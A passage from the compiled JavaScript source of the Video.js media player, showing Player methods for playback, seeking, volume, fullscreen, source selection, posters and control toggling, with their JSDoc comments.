     * @event Player#ended
     * @type {EventTarget~Event}
     */
    this.trigger('ended');
  };

  /**
   * Fired when the duration of the media resource is first known or changed
   *
   * @listens Tech#durationchange
   * @private
   */


  Player.prototype.handleTechDurationChange_ = function handleTechDurationChange_() {
    this.duration(this.techGet_('duration'));
  };

  /**
   * Handle a click on the media element to play/pause
   *
   * @param {EventTarget~Event} event
   *        the event that caused this function to trigger
   *
   * @listens Tech#mousedown
   * @private
   */


  Player.prototype.handleTechClick_ = function handleTechClick_(event) {
    if (!isSingleLeftClick(event)) {
      return;
    }

    // When controls are disabled a click should not toggle playback because
    // the click is considered a control
    if (!this.controls_) {
      return;
    }

    if (this.paused()) {
      silencePromise(this.play());
    } else {
      this.pause();
    }
  };

  /**
   * Handle a tap on the media element. It will toggle the user
   * activity state, which hides and shows the controls.
   *
   * @listens Tech#tap
   * @private
   */


  Player.prototype.handleTechTap_ = function handleTechTap_() {
    this.userActive(!this.userActive());
  };

  /**
   * Handle touch to start
   *
   * @listens Tech#touchstart
   * @private
   */


  Player.prototype.handleTechTouchStart_ = function handleTechTouchStart_() {
    this.userWasActive = this.userActive();
  };

  /**
   * Handle touch to move
   *
   * @listens Tech#touchmove
   * @private
   */


  Player.prototype.handleTechTouchMove_ = function handleTechTouchMove_() {
    if (this.userWasActive) {
      this.reportUserActivity();
    }
  };

  /**
   * Handle touch to end
   *
   * @param {EventTarget~Event} event
   *        the touchend event that triggered
   *        this function
   *
   * @listens Tech#touchend
   * @private
   */


  Player.prototype.handleTechTouchEnd_ = function handleTechTouchEnd_(event) {
    // Stop the mouse events from also happening
    event.preventDefault();
  };

  /**
   * Fired when the player switches in or out of fullscreen mode
   *
   * @private
   * @listens Player#fullscreenchange
   */


  Player.prototype.handleFullscreenChange_ = function handleFullscreenChange_() {
    if (this.isFullscreen()) {
      this.addClass('vjs-fullscreen');
    } else {
      this.removeClass('vjs-fullscreen');
    }
  };

  /**
   * native click events on the SWF aren't triggered on IE11, Win8.1RT
   * use stageclick events triggered from inside the SWF instead
   *
   * @private
   * @listens stageclick
   */


  Player.prototype.handleStageClick_ = function handleStageClick_() {
    this.reportUserActivity();
  };

  /**
   * Handle Tech Fullscreen Change
   *
   * @param {EventTarget~Event} event
   *        the fullscreenchange event that triggered this function
   *
   * @param {Object} data
   *        the data that was sent with the event
   *
   * @private
   * @listens Tech#fullscreenchange
   * @fires Player#fullscreenchange
   */


  Player.prototype.handleTechFullscreenChange_ = function handleTechFullscreenChange_(event, data) {
    if (data) {
      this.isFullscreen(data.isFullscreen);
    }
    /**
     * Fired when going in and out of fullscreen.
     *
     * @event Player#fullscreenchange
     * @type {EventTarget~Event}
     */
    this.trigger('fullscreenchange');
  };

  /**
   * Fires when an error occurred during the loading of an audio/video.
   *
   * @private
   * @listens Tech#error
   */


  Player.prototype.handleTechError_ = function handleTechError_() {
    var error = this.tech_.error();

    this.error(error);
  };

  /**
   * Retrigger the `textdata` event that was triggered by the {@link Tech}.
   *
   * @fires Player#textdata
   * @listens Tech#textdata
   * @private
   */


  Player.prototype.handleTechTextData_ = function handleTechTextData_() {
    var data = null;

    if (arguments.length > 1) {
      data = arguments[1];
    }

    /**
     * Fires when we get a textdata event from tech
     *
     * @event Player#textdata
     * @type {EventTarget~Event}
     */
    this.trigger('textdata', data);
  };

  /**
   * Get object for cached values.
   *
   * @return {Object}
   *         get the current object cache
   */


  Player.prototype.getCache = function getCache() {
    return this.cache_;
  };

  /**
   * Pass values to the playback tech
   *
   * @param {string} [method]
   *        the method to call
   *
   * @param {Object} arg
   *        the argument to pass
   *
   * @private
   */


  Player.prototype.techCall_ = function techCall_(method, arg) {
    // If it's not ready yet, call method when it is

    this.ready(function () {
      if (method in allowedSetters) {
        return set$1(this.middleware_, this.tech_, method, arg);
      } else if (method in allowedMediators) {
        return mediate(this.middleware_, this.tech_, method, arg);
      }

      try {
        if (this.tech_) {
          this.tech_[method](arg);
        }
      } catch (e) {
        log$1(e);
        throw e;
      }
    }, true);
  };

  /**
   * Get calls can't wait for the tech, and sometimes don't need to.
   *
   * @param {string} method
   *        Tech method
   *
   * @return {Function|undefined}
   *         the method or undefined
   *
   * @private
   */


  Player.prototype.techGet_ = function techGet_(method) {
    if (!this.tech_ || !this.tech_.isReady_) {
      return;
    }

    if (method in allowedGetters) {
      return get$1(this.middleware_, this.tech_, method);
    } else if (method in allowedMediators) {
      return mediate(this.middleware_, this.tech_, method);
    }

    // Flash likes to die and reload when you hide or reposition it.
    // In these cases the object methods go away and we get errors.
    // When that happens we'll catch the errors and inform tech that it's not ready any more.
    try {
      return this.tech_[method]();
    } catch (e) {

      // When building additional tech libs, an expected method may not be defined yet
      if (this.tech_[method] === undefined) {
        log$1('Video.js: ' + method + ' method not defined for ' + this.techName_ + ' playback technology.', e);
        throw e;
      }

      // When a method isn't available on the object it throws a TypeError
      if (e.name === 'TypeError') {
        log$1('Video.js: ' + method + ' unavailable on ' + this.techName_ + ' playback technology element.', e);
        this.tech_.isReady_ = false;
        throw e;
      }

      // If error unknown, just log and throw
      log$1(e);
      throw e;
    }
  };

  /**
   * Attempt to begin playback at the first opportunity.
   *
   * @return {Promise|undefined}
   *         Returns a `Promise` only if the browser returns one and the player
   *         is ready to begin playback. For some browsers and all non-ready
   *         situations, this will return `undefined`.
   */


  Player.prototype.play = function play() {
    var _this6 = this;

    // If this is called while we have a play queued up on a loadstart, remove
    // that listener to avoid getting in a potentially bad state.
    if (this.playOnLoadstart_) {
      this.off('loadstart', this.playOnLoadstart_);
    }

    // If the player/tech is not ready, queue up another call to `play()` for
    // when it is. This will loop back into this method for another attempt at
    // playback when the tech is ready.
    if (!this.isReady_) {

      // Bail out if we're already waiting for `ready`!
      if (this.playWaitingForReady_) {
        return;
      }

      this.playWaitingForReady_ = true;
      this.ready(function () {
        _this6.playWaitingForReady_ = false;
        silencePromise(_this6.play());
      });

      // If the player/tech is ready and we have a source, we can attempt playback.
    } else if (!this.changingSrc_ && (this.src() || this.currentSrc())) {
      return this.techGet_('play');

      // If the tech is ready, but we do not have a source, we'll need to wait
      // for both the `ready` and a `loadstart` when the source is finally
      // resolved by middleware and set on the player.
      //
      // This can happen if `play()` is called while changing sources or before
      // one has been set on the player.
    } else {

      this.playOnLoadstart_ = function () {
        _this6.playOnLoadstart_ = null;
        silencePromise(_this6.play());
      };

      this.one('loadstart', this.playOnLoadstart_);
    }
  };

  /**
   * Pause the video playback
   *
   * @return {Player}
   *         A reference to the player object this function was called on
   */


  Player.prototype.pause = function pause() {
    this.techCall_('pause');
  };

  /**
   * Check if the player is paused or has yet to play
   *
   * @return {boolean}
   *         - false: if the media is currently playing
   *         - true: if media is not currently playing
   */


  Player.prototype.paused = function paused() {
    // The initial state of paused should be true (in Safari it's actually false)
    return this.techGet_('paused') === false ? false : true;
  };

  /**
   * Get a TimeRange object representing the current ranges of time that the user
   * has played.
   *
   * @return {TimeRange}
   *         A time range object that represents all the increments of time that have
   *         been played.
   */


  Player.prototype.played = function played() {
    return this.techGet_('played') || createTimeRanges(0, 0);
  };

  /**
   * Returns whether or not the user is "scrubbing". Scrubbing is
   * when the user has clicked the progress bar handle and is
   * dragging it along the progress bar.
   *
   * @param {boolean} [isScrubbing]
   *        wether the user is or is not scrubbing
   *
   * @return {boolean}
   *         The value of scrubbing when getting
   */


  Player.prototype.scrubbing = function scrubbing(isScrubbing) {
    if (typeof isScrubbing === 'undefined') {
      return this.scrubbing_;
    }
    this.scrubbing_ = !!isScrubbing;

    if (isScrubbing) {
      this.addClass('vjs-scrubbing');
    } else {
      this.removeClass('vjs-scrubbing');
    }
  };

  /**
   * Get or set the current time (in seconds)
   *
   * @param {number|string} [seconds]
   *        The time to seek to in seconds
   *
   * @return {number}
   *         - the current time in seconds when getting
   */


  Player.prototype.currentTime = function currentTime(seconds) {
    if (typeof seconds !== 'undefined') {
      if (seconds < 0) {
        seconds = 0;
      }
      this.techCall_('setCurrentTime', seconds);
      return;
    }

    // cache last currentTime and return. default to 0 seconds
    //
    // Caching the currentTime is meant to prevent a massive amount of reads on the tech's
    // currentTime when scrubbing, but may not provide much performance benefit afterall.
    // Should be tested. Also something has to read the actual current time or the cache will
    // never get updated.
    this.cache_.currentTime = this.techGet_('currentTime') || 0;
    return this.cache_.currentTime;
  };

  /**
   * Normally gets the length in time of the video in seconds;
   * in all but the rarest use cases an argument will NOT be passed to the method
   *
   * > **NOTE**: The video must have started loading before the duration can be
   * known, and in the case of Flash, may not be known until the video starts
   * playing.
   *
   * @fires Player#durationchange
   *
   * @param {number} [seconds]
   *        The duration of the video to set in seconds
   *
   * @return {number}
   *         - The duration of the video in seconds when getting
   */


  Player.prototype.duration = function duration(seconds) {
    if (seconds === undefined) {
      // return NaN if the duration is not known
      return this.cache_.duration !== undefined ? this.cache_.duration : NaN;
    }

    seconds = parseFloat(seconds);

    // Standardize on Inifity for signaling video is live
    if (seconds < 0) {
      seconds = Infinity;
    }

    if (seconds !== this.cache_.duration) {
      // Cache the last set value for optimized scrubbing (esp. Flash)
      this.cache_.duration = seconds;

      if (seconds === Infinity) {
        this.addClass('vjs-live');
      } else {
        this.removeClass('vjs-live');
      }
      /**
       * @event Player#durationchange
       * @type {EventTarget~Event}
       */
      this.trigger('durationchange');
    }
  };

  /**
   * Calculates how much time is left in the video. Not part
   * of the native video API.
   *
   * @return {number}
   *         The time remaining in seconds
   */


  Player.prototype.remainingTime = function remainingTime() {
    return this.duration() - this.currentTime();
  };

  /**
   * A remaining time function that is intented to be used when
   * the time is to be displayed directly to the user.
   *
   * @return {number}
   *         The rounded time remaining in seconds
   */


  Player.prototype.remainingTimeDisplay = function remainingTimeDisplay() {
    return Math.floor(this.duration()) - Math.floor(this.currentTime());
  };

  //
  // Kind of like an array of portions of the video that have been downloaded.

  /**
   * Get a TimeRange object with an array of the times of the video
   * that have been downloaded. If you just want the percent of the
   * video that's been downloaded, use bufferedPercent.
   *
   * @see [Buffered Spec]{@link http://dev.w3.org/html5/spec/video.html#dom-media-buffered}
   *
   * @return {TimeRange}
   *         A mock TimeRange object (following HTML spec)
   */


  Player.prototype.buffered = function buffered() {
    var buffered = this.techGet_('buffered');

    if (!buffered || !buffered.length) {
      buffered = createTimeRanges(0, 0);
    }

    return buffered;
  };

  /**
   * Get the percent (as a decimal) of the video that's been downloaded.
   * This method is not a part of the native HTML video API.
   *
   * @return {number}
   *         A decimal between 0 and 1 representing the percent
   *         that is bufferred 0 being 0% and 1 being 100%
   */


  Player.prototype.bufferedPercent = function bufferedPercent$$1() {
    return bufferedPercent(this.buffered(), this.duration());
  };

  /**
   * Get the ending time of the last buffered time range
   * This is used in the progress bar to encapsulate all time ranges.
   *
   * @return {number}
   *         The end of the last buffered time range
   */


  Player.prototype.bufferedEnd = function bufferedEnd() {
    var buffered = this.buffered();
    var duration = this.duration();
    var end = buffered.end(buffered.length - 1);

    if (end > duration) {
      end = duration;
    }

    return end;
  };

  /**
   * Get or set the current volume of the media
   *
   * @param  {number} [percentAsDecimal]
   *         The new volume as a decimal percent:
   *         - 0 is muted/0%/off
   *         - 1.0 is 100%/full
   *         - 0.5 is half volume or 50%
   *
   * @return {number}
   *         The current volume as a percent when getting
   */


  Player.prototype.volume = function volume(percentAsDecimal) {
    var vol = void 0;

    if (percentAsDecimal !== undefined) {
      // Force value to between 0 and 1
      vol = Math.max(0, Math.min(1, parseFloat(percentAsDecimal)));
      this.cache_.volume = vol;
      this.techCall_('setVolume', vol);

      if (vol > 0) {
        this.lastVolume_(vol);
      }

      return;
    }

    // Default to 1 when returning current volume.
    vol = parseFloat(this.techGet_('volume'));
    return isNaN(vol) ? 1 : vol;
  };

  /**
   * Get the current muted state, or turn mute on or off
   *
   * @param {boolean} [muted]
   *        - true to mute
   *        - false to unmute
   *
   * @return {boolean}
   *         - true if mute is on and getting
   *         - false if mute is off and getting
   */


  Player.prototype.muted = function muted(_muted) {
    if (_muted !== undefined) {
      this.techCall_('setMuted', _muted);
      return;
    }
    return this.techGet_('muted') || false;
  };

  /**
   * Get the current defaultMuted state, or turn defaultMuted on or off. defaultMuted
   * indicates the state of muted on intial playback.
   *
   * ```js
   *   var myPlayer = videojs('some-player-id');
   *
   *   myPlayer.src("http://www.example.com/path/to/video.mp4");
   *
   *   // get, should be false
   *   console.log(myPlayer.defaultMuted());
   *   // set to true
   *   myPlayer.defaultMuted(true);
   *   // get should be true
   *   console.log(myPlayer.defaultMuted());
   * ```
   *
   * @param {boolean} [defaultMuted]
   *        - true to mute
   *        - false to unmute
   *
   * @return {boolean|Player}
   *         - true if defaultMuted is on and getting
   *         - false if defaultMuted is off and getting
   *         - A reference to the current player when setting
   */


  Player.prototype.defaultMuted = function defaultMuted(_defaultMuted) {
    if (_defaultMuted !== undefined) {
      return this.techCall_('setDefaultMuted', _defaultMuted);
    }
    return this.techGet_('defaultMuted') || false;
  };

  /**
   * Get the last volume, or set it
   *
   * @param  {number} [percentAsDecimal]
   *         The new last volume as a decimal percent:
   *         - 0 is muted/0%/off
   *         - 1.0 is 100%/full
   *         - 0.5 is half volume or 50%
   *
   * @return {number}
   *         the current value of lastVolume as a percent when getting
   *
   * @private
   */


  Player.prototype.lastVolume_ = function lastVolume_(percentAsDecimal) {
    if (percentAsDecimal !== undefined && percentAsDecimal !== 0) {
      this.cache_.lastVolume = percentAsDecimal;
      return;
    }
    return this.cache_.lastVolume;
  };

  /**
   * Check if current tech can support native fullscreen
   * (e.g. with built in controls like iOS, so not our flash swf)
   *
   * @return {boolean}
   *         if native fullscreen is supported
   */


  Player.prototype.supportsFullScreen = function supportsFullScreen() {
    return this.techGet_('supportsFullScreen') || false;
  };

  /**
   * Check if the player is in fullscreen mode or tell the player that it
   * is or is not in fullscreen mode.
   *
   * > NOTE: As of the latest HTML5 spec, isFullscreen is no longer an official
   * property and instead document.fullscreenElement is used. But isFullscreen is
   * still a valuable property for internal player workings.
   *
   * @param  {boolean} [isFS]
   *         Set the players current fullscreen state
   *
   * @return {boolean}
   *         - true if fullscreen is on and getting
   *         - false if fullscreen is off and getting
   */


  Player.prototype.isFullscreen = function isFullscreen(isFS) {
    if (isFS !== undefined) {
      this.isFullscreen_ = !!isFS;
      return;
    }
    return !!this.isFullscreen_;
  };

  /**
   * Increase the size of the video to full screen
   * In some browsers, full screen is not supported natively, so it enters
   * "full window mode", where the video fills the browser window.
   * In browsers and devices that support native full screen, sometimes the
   * browser's default controls will be shown, and not the Video.js custom skin.
   * This includes most mobile devices (iOS, Android) and older versions of
   * Safari.
   *
   * @fires Player#fullscreenchange
   */


  Player.prototype.requestFullscreen = function requestFullscreen() {
    var fsApi = FullscreenApi;

    this.isFullscreen(true);

    if (fsApi.requestFullscreen) {
      // the browser supports going fullscreen at the element level so we can
      // take the controls fullscreen as well as the video

      // Trigger fullscreenchange event after change
      // We have to specifically add this each time, and remove
      // when canceling fullscreen. Otherwise if there's multiple
      // players on a page, they would all be reacting to the same fullscreen
      // events
      on(document_1, fsApi.fullscreenchange, bind(this, function documentFullscreenChange(e) {
        this.isFullscreen(document_1[fsApi.fullscreenElement]);

        // If cancelling fullscreen, remove event listener.
        if (this.isFullscreen() === false) {
          off(document_1, fsApi.fullscreenchange, documentFullscreenChange);
        }
        /**
         * @event Player#fullscreenchange
         * @type {EventTarget~Event}
         */
        this.trigger('fullscreenchange');
      }));

      this.el_[fsApi.requestFullscreen]();
    } else if (this.tech_.supportsFullScreen()) {
      // we can't take the video.js controls fullscreen but we can go fullscreen
      // with native controls
      this.techCall_('enterFullScreen');
    } else {
      // fullscreen isn't supported so we'll just stretch the video element to
      // fill the viewport
      this.enterFullWindow();
      /**
       * @event Player#fullscreenchange
       * @type {EventTarget~Event}
       */
      this.trigger('fullscreenchange');
    }
  };

  /**
   * Return the video to its normal size after having been in full screen mode
   *
   * @fires Player#fullscreenchange
   */


  Player.prototype.exitFullscreen = function exitFullscreen() {
    var fsApi = FullscreenApi;

    this.isFullscreen(false);

    // Check for browser element fullscreen support
    if (fsApi.requestFullscreen) {
      document_1[fsApi.exitFullscreen]();
    } else if (this.tech_.supportsFullScreen()) {
      this.techCall_('exitFullScreen');
    } else {
      this.exitFullWindow();
      /**
       * @event Player#fullscreenchange
       * @type {EventTarget~Event}
       */
      this.trigger('fullscreenchange');
    }
  };

  /**
   * When fullscreen isn't supported we can stretch the
   * video container to as wide as the browser will let us.
   *
   * @fires Player#enterFullWindow
   */


  Player.prototype.enterFullWindow = function enterFullWindow() {
    this.isFullWindow = true;

    // Storing original doc overflow value to return to when fullscreen is off
    this.docOrigOverflow = document_1.documentElement.style.overflow;

    // Add listener for esc key to exit fullscreen
    on(document_1, 'keydown', bind(this, this.fullWindowOnEscKey));

    // Hide any scroll bars
    document_1.documentElement.style.overflow = 'hidden';

    // Apply fullscreen styles
    addClass(document_1.body, 'vjs-full-window');

    /**
     * @event Player#enterFullWindow
     * @type {EventTarget~Event}
     */
    this.trigger('enterFullWindow');
  };

  /**
   * Check for call to either exit full window or
   * full screen on ESC key
   *
   * @param {string} event
   *        Event to check for key press
   */


  Player.prototype.fullWindowOnEscKey = function fullWindowOnEscKey(event) {
    if (event.keyCode === 27) {
      if (this.isFullscreen() === true) {
        this.exitFullscreen();
      } else {
        this.exitFullWindow();
      }
    }
  };

  /**
   * Exit full window
   *
   * @fires Player#exitFullWindow
   */


  Player.prototype.exitFullWindow = function exitFullWindow() {
    this.isFullWindow = false;
    off(document_1, 'keydown', this.fullWindowOnEscKey);

    // Unhide scroll bars.
    document_1.documentElement.style.overflow = this.docOrigOverflow;

    // Remove fullscreen styles
    removeClass(document_1.body, 'vjs-full-window');

    // Resize the box, controller, and poster to original sizes
    // this.positionAll();
    /**
     * @event Player#exitFullWindow
     * @type {EventTarget~Event}
     */
    this.trigger('exitFullWindow');
  };

  /**
   * Check whether the player can play a given mimetype
   *
   * @see https://www.w3.org/TR/2011/WD-html5-20110113/video.html#dom-navigator-canplaytype
   *
   * @param {string} type
   *        The mimetype to check
   *
   * @return {string}
   *         'probably', 'maybe', or '' (empty string)
   */


  Player.prototype.canPlayType = function canPlayType(type) {
    var can = void 0;

    // Loop through each playback technology in the options order
    for (var i = 0, j = this.options_.techOrder; i < j.length; i++) {
      var techName = j[i];
      var tech = Tech.getTech(techName);

      // Support old behavior of techs being registered as components.
      // Remove once that deprecated behavior is removed.
      if (!tech) {
        tech = Component.getComponent(techName);
      }

      // Check if the current tech is defined before continuing
      if (!tech) {
        log$1.error('The "' + techName + '" tech is undefined. Skipped browser support check for that tech.');
        continue;
      }

      // Check if the browser supports this technology
      if (tech.isSupported()) {
        can = tech.canPlayType(type);

        if (can) {
          return can;
        }
      }
    }

    return '';
  };

  /**
   * Select source based on tech-order or source-order
   * Uses source-order selection if `options.sourceOrder` is truthy. Otherwise,
   * defaults to tech-order selection
   *
   * @param {Array} sources
   *        The sources for a media asset
   *
   * @return {Object|boolean}
   *         Object of source and tech order or false
   */


  Player.prototype.selectSource = function selectSource(sources) {
    var _this7 = this;

    // Get only the techs specified in `techOrder` that exist and are supported by the
    // current platform
    var techs = this.options_.techOrder.map(function (techName) {
      return [techName, Tech.getTech(techName)];
    }).filter(function (_ref) {
      var techName = _ref[0],
          tech = _ref[1];

      // Check if the current tech is defined before continuing
      if (tech) {
        // Check if the browser supports this technology
        return tech.isSupported();
      }

      log$1.error('The "' + techName + '" tech is undefined. Skipped browser support check for that tech.');
      return false;
    });

    // Iterate over each `innerArray` element once per `outerArray` element and execute
    // `tester` with both. If `tester` returns a non-falsy value, exit early and return
    // that value.
    var findFirstPassingTechSourcePair = function findFirstPassingTechSourcePair(outerArray, innerArray, tester) {
      var found = void 0;

      outerArray.some(function (outerChoice) {
        return innerArray.some(function (innerChoice) {
          found = tester(outerChoice, innerChoice);

          if (found) {
            return true;
          }
        });
      });

      return found;
    };

    var foundSourceAndTech = void 0;
    var flip = function flip(fn) {
      return function (a, b) {
        return fn(b, a);
      };
    };
    var finder = function finder(_ref2, source) {
      var techName = _ref2[0],
          tech = _ref2[1];

      if (tech.canPlaySource(source, _this7.options_[techName.toLowerCase()])) {
        return { source: source, tech: techName };
      }
    };

    // Depending on the truthiness of `options.sourceOrder`, we swap the order of techs and sources
    // to select from them based on their priority.
    if (this.options_.sourceOrder) {
      // Source-first ordering
      foundSourceAndTech = findFirstPassingTechSourcePair(sources, techs, flip(finder));
    } else {
      // Tech-first ordering
      foundSourceAndTech = findFirstPassingTechSourcePair(techs, sources, finder);
    }

    return foundSourceAndTech || false;
  };

  /**
   * Get or set the video source.
   *
   * @param {Tech~SourceObject|Tech~SourceObject[]|string} [source]
   *        A SourceObject, an array of SourceObjects, or a string referencing
   *        a URL to a media source. It is _highly recommended_ that an object
   *        or array of objects is used here, so that source selection
   *        algorithms can take the `type` into account.
   *
   *        If not provided, this method acts as a getter.
   *
   * @return {string|undefined}
   *         If the `source` argument is missing, returns the current source
   *         URL. Otherwise, returns nothing/undefined.
   */


  Player.prototype.src = function src(source) {
    var _this8 = this;

    // getter usage
    if (typeof source === 'undefined') {
      return this.cache_.src || '';
    }
    // filter out invalid sources and turn our source into
    // an array of source objects
    var sources = filterSource(source);

    // if a source was passed in then it is invalid because
    // it was filtered to a zero length Array. So we have to
    // show an error
    if (!sources.length) {
      this.setTimeout(function () {
        this.error({ code: 4, message: this.localize(this.options_.notSupportedMessage) });
      }, 0);
      return;
    }

    // intial sources
    this.changingSrc_ = true;

    this.cache_.sources = sources;
    this.updateSourceCaches_(sources[0]);

    // middlewareSource is the source after it has been changed by middleware
    setSource(this, sources[0], function (middlewareSource, mws) {
      _this8.middleware_ = mws;

      // since sourceSet is async we have to update the cache again after we select a source since
      // the source that is selected could be out of order from the cache update above this callback.
      _this8.cache_.sources = sources;
      _this8.updateSourceCaches_(middlewareSource);

      var err = _this8.src_(middlewareSource);

      if (err) {
        if (sources.length > 1) {
          return _this8.src(sources.slice(1));
        }

        _this8.changingSrc_ = false;

        // We need to wrap this in a timeout to give folks a chance to add error event handlers
        _this8.setTimeout(function () {
          this.error({ code: 4, message: this.localize(this.options_.notSupportedMessage) });
        }, 0);

        // we could not find an appropriate tech, but let's still notify the delegate that this is it
        // this needs a better comment about why this is needed
        _this8.triggerReady();

        return;
      }

      setTech(mws, _this8.tech_);
    });
  };

  /**
   * Set the source object on the tech, returns a boolean that indicates wether
   * there is a tech that can play the source or not
   *
   * @param {Tech~SourceObject} source
   *        The source object to set on the Tech
   *
   * @return {Boolean}
   *         - True if there is no Tech to playback this source
   *         - False otherwise
   *
   * @private
   */


  Player.prototype.src_ = function src_(source) {
    var _this9 = this;

    var sourceTech = this.selectSource([source]);

    if (!sourceTech) {
      return true;
    }

    if (!titleCaseEquals(sourceTech.tech, this.techName_)) {
      this.changingSrc_ = true;
      // load this technology with the chosen source
      this.loadTech_(sourceTech.tech, sourceTech.source);
      this.tech_.ready(function () {
        _this9.changingSrc_ = false;
      });
      return false;
    }

    // wait until the tech is ready to set the source
    // and set it synchronously if possible (#2326)
    this.ready(function () {

      // The setSource tech method was added with source handlers
      // so older techs won't support it
      // We need to check the direct prototype for the case where subclasses
      // of the tech do not support source handlers
      if (this.tech_.constructor.prototype.hasOwnProperty('setSource')) {
        this.techCall_('setSource', source);
      } else {
        this.techCall_('src', source.src);
      }

      this.changingSrc_ = false;
    }, true);

    return false;
  };

  /**
   * Begin loading the src data.
   */


  Player.prototype.load = function load() {
    this.techCall_('load');
  };

  /**
   * Reset the player. Loads the first tech in the techOrder,
   * and calls `reset` on the tech`.
   */


  Player.prototype.reset = function reset() {
    this.loadTech_(this.options_.techOrder[0], null);
    this.techCall_('reset');
  };

  /**
   * Returns all of the current source objects.
   *
   * @return {Tech~SourceObject[]}
   *         The current source objects
   */


  Player.prototype.currentSources = function currentSources() {
    var source = this.currentSource();
    var sources = [];

    // assume `{}` or `{ src }`
    if (Object.keys(source).length !== 0) {
      sources.push(source);
    }

    return this.cache_.sources || sources;
  };

  /**
   * Returns the current source object.
   *
   * @return {Tech~SourceObject}
   *         The current source object
   */


  Player.prototype.currentSource = function currentSource() {
    return this.cache_.source || {};
  };

  /**
   * Returns the fully qualified URL of the current source value e.g. http://mysite.com/video.mp4
   * Can be used in conjuction with `currentType` to assist in rebuilding the current source object.
   *
   * @return {string}
   *         The current source
   */


  Player.prototype.currentSrc = function currentSrc() {
    return this.currentSource() && this.currentSource().src || '';
  };

  /**
   * Get the current source type e.g. video/mp4
   * This can allow you rebuild the current source object so that you could load the same
   * source and tech later
   *
   * @return {string}
   *         The source MIME type
   */


  Player.prototype.currentType = function currentType() {
    return this.currentSource() && this.currentSource().type || '';
  };

  /**
   * Get or set the preload attribute
   *
   * @param {boolean} [value]
   *        - true means that we should preload
   *        - false maens that we should not preload
   *
   * @return {string}
   *         The preload attribute value when getting
   */


  Player.prototype.preload = function preload(value) {
    if (value !== undefined) {
      this.techCall_('setPreload', value);
      this.options_.preload = value;
      return;
    }
    return this.techGet_('preload');
  };

  /**
   * Get or set the autoplay attribute.
   *
   * @param {boolean} [value]
   *        - true means that we should autoplay
   *        - false means that we should not autoplay
   *
   * @return {string}
   *         The current value of autoplay when getting
   */


  Player.prototype.autoplay = function autoplay(value) {
    if (value !== undefined) {
      this.techCall_('setAutoplay', value);
      this.options_.autoplay = value;
      return;
    }
    return this.techGet_('autoplay', value);
  };

  /**
   * Set or unset the playsinline attribute.
   * Playsinline tells the browser that non-fullscreen playback is preferred.
   *
   * @param {boolean} [value]
   *        - true means that we should try to play inline by default
   *        - false means that we should use the browser's default playback mode,
   *          which in most cases is inline. iOS Safari is a notable exception
   *          and plays fullscreen by default.
   *
   * @return {string|Player}
   *         - the current value of playsinline
   *         - the player when setting
   *
   * @see [Spec]{@link https://html.spec.whatwg.org/#attr-video-playsinline}
   */


  Player.prototype.playsinline = function playsinline(value) {
    if (value !== undefined) {
      this.techCall_('setPlaysinline', value);
      this.options_.playsinline = value;
      return this;
    }
    return this.techGet_('playsinline');
  };

  /**
   * Get or set the loop attribute on the video element.
   *
   * @param {boolean} [value]
   *        - true means that we should loop the video
   *        - false means that we should not loop the video
   *
   * @return {string}
   *         The current value of loop when getting
   */


  Player.prototype.loop = function loop(value) {
    if (value !== undefined) {
      this.techCall_('setLoop', value);
      this.options_.loop = value;
      return;
    }
    return this.techGet_('loop');
  };

  /**
   * Get or set the poster image source url
   *
   * @fires Player#posterchange
   *
   * @param {string} [src]
   *        Poster image source URL
   *
   * @return {string}
   *         The current value of poster when getting
   */


  Player.prototype.poster = function poster(src) {
    if (src === undefined) {
      return this.poster_;
    }

    // The correct way to remove a poster is to set as an empty string
    // other falsey values will throw errors
    if (!src) {
      src = '';
    }

    if (src === this.poster_) {
      return;
    }

    // update the internal poster variable
    this.poster_ = src;

    // update the tech's poster
    this.techCall_('setPoster', src);

    this.isPosterFromTech_ = false;

    // alert components that the poster has been set
    /**
     * This event fires when the poster image is changed on the player.
     *
     * @event Player#posterchange
     * @type {EventTarget~Event}
     */
    this.trigger('posterchange');
  };

  /**
   * Some techs (e.g. YouTube) can provide a poster source in an
   * asynchronous way. We want the poster component to use this
   * poster source so that it covers up the tech's controls.
   * (YouTube's play button). However we only want to use this
   * source if the player user hasn't set a poster through
   * the normal APIs.
   *
   * @fires Player#posterchange
   * @listens Tech#posterchange
   * @private
   */


  Player.prototype.handleTechPosterChange_ = function handleTechPosterChange_() {
    if ((!this.poster_ || this.options_.techCanOverridePoster) && this.tech_ && this.tech_.poster) {
      var newPoster = this.tech_.poster() || '';

      if (newPoster !== this.poster_) {
        this.poster_ = newPoster;
        this.isPosterFromTech_ = true;

        // Let components know the poster has changed
        this.trigger('posterchange');
      }
    }
  };

  /**
   * Get or set whether or not the controls are showing.
   *
   * @fires Player#controlsenabled
   *
   * @param {boolean} [bool]
   *        - true to turn controls on
   *        - false to turn controls off
   *
   * @return {boolean}
   *         The current value of controls when getting
   */


  Player.prototype.controls = function controls(bool) {
    if (bool === undefined) {
      return !!this.controls_;
    }

    bool = !!bool;

    // Don't trigger a change event unless it actually changed
    if (this.controls_ === bool) {
      return;
    }

    this.controls_ = bool;

    if (this.usingNativeControls()) {
      this.techCall_('setControls', bool);
    }

    if (this.controls_) {
      this.removeClass('vjs-controls-disabled');
      this.addClass('vjs-controls-enabled');
      /**
       * @event Player#controlsenabled
       * @type {EventTarget~Event}
       */
      this.trigger('controlsenabled');
      if (!this.usingNativeControls()) {
        this.addTechControlsListeners_();
      }
    } else {
      this.removeClass('vjs-controls-enabled');
      this.addClass('vjs-controls-disabled');
      /**
       * @event Player#controlsdisabled
       * @type {EventTarget~Event}
       */
      this.trigger('controlsdisabled');
      if (!this.usingNativeControls()) {
        this.removeTechControlsListeners_();
      }
    }
  };

  /**
   * Toggle native controls on/off. Native controls are the controls built into
   * devices (e.g. default iPhone controls), Flash, or other techs
   * (e.g. Vimeo Controls)
   * **This should only be set by the current tech, because only the tech knows
   * if it can support native controls**
   *
   * @fires Player#usingnativecontrols
   * @fires Player#usingcustomcontrols
   *
   * @param {boolean} [bool]
   *        - true to turn native controls on
   *        - false to turn native controls off
   *
   * @return {boolean}
   *         The current value of native controls when getting
   */


  Player.prototype.usingNativeControls = function usingNativeControls(bool) {
    if (bool === undefined) {
      return !!this.usingNativeControls_;
    }

    bool = !!bool;

    // Don't trigger a change event unless it actually changed
    if (this.usingNativeControls_ === bool) {
      return;
    }

    this.usingNativeControls_ = bool;

    if (this.usingNativeControls_) {
      this.addClass('vjs-using-native-controls');

      /**
       * player is using the native device controls
       *
       * @event Player#usingnativecontrols
       * @type {EventTarget~Event}
       */
      this.trigger('usingnativecontrols');
    } else {
      this.removeClass('vjs-using-native-controls');

      /**
       * player is using the custom HTML controls
       *
       * @event Player#usingcustomcontrols
